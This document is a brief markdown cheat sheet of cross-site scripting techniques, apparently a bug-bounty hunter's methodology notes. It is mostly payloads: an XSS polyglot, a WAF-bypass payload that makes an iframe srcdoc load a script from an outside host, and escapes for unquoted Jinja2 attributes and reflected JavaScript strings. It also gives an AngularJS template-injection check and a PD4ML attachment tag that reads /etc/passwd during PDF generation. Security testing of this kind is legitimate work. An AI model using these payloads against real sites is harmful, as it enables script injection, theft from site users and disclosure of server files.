### XSS ployglot
```
\u0022\u003c%26quot;%26gt;%26lt;"';}};"></ScRipt><svg/oNLoad=confirm(69)>${{7*7}}
```

#### XSS in SVG image 
![image](https://github.com/Sameer484/methodology/assets/110039044/e40a3018-7707-457b-a054-bf3bb3832674)


##### If there is reflected value in the iframe src but akamai blocks it, we can try to bypass it using below payload
````
link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>

````
![Screenshot from 2023-06-16 18-53-58](https://github.com/Sameer484/methodology/assets/110039044/58c56999-42da-4fcb-a447-b11f9e223984)

#### If you found jinja2 templating engine being used , then see if the double quote is placed when using templating syntax in attribute. If directly {{name}} is being used then we can use "x eventhandler=alert(1)" to execute xss. Using space we can escape the attribute.
````
<input type={{name}}>         ==> vulnerable code
<input type="{{name}}" >      ==> well secure code
````
---
#### Quick tips
- See the reflected value and open inspect element. Search(ctrl+f) for the entered keywords and trace where is it being used.
- If the value is being set to variable , we can escape it and enter javascript
  ````
  var a= "hacked"    //hacked is searched keyword in search bar and it is being assigned here like this.

  we can escape it using
     hacked";alert(2)//
  ````

- If no value are reflected in the response , then test for DOM based XSS. Open DOM Invador and enter the canary value in the search bar or anywhere in the query parameter.
- See if the website is built with Angular js. Now see if the reflected payload is inside the  ng-app directive{\<div ng-app> hacked(this is reflected value)}, check for {{7*7}} CSTI and if DOM is reflected with 49, then it's confirmed that CSTI is possible. 
 
  ---
 - XSS Basic Payload  ( anything'"<x</   )
## XSS in PDF generation using PD4ML library
The normal javascript injection doesn't work with pd4ml, but there is way to add attachment to the pdf. This way we can read internal files.
`<pd4ml:attachment src=”file:///etc/passwd”><pd4ml:attachment>`
